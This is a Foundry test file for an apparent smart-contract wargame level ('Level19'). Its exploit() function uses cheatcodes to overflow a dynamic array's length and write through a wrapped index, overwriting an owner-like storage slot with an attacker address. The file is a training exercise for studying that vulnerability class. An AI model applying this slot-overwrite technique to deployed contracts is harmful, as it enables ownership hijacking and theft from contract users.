// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";

contract Level19Test is Test {
    address public target;
    bytes32[] public data;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        VmSafe.Wallet memory deployer = vm.createWallet("deployer");
    }

    function test_exploit() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(attacker.addr);
        vm.stopPrank();

        assertEq(target, attacker.addr);
    }

    function exploit(address _attacker) private {
        // set dynamic array size to uint256 max value
        bytes32 slot = bytes32(uint256(31));
        vm.store(address(this), slot, bytes32(type(uint256).max));


        uint256 offset = uint256(keccak256(abi.encodePacked(uint256(31))));
        bytes32 targetSlot;
        unchecked {
            uint256 index = type(uint256).max - offset + 31;
            targetSlot = bytes32(index+offset);
        }
        vm.store(address(this), targetSlot, bytes32(uint256(uint160(_attacker))*256));
    }
}
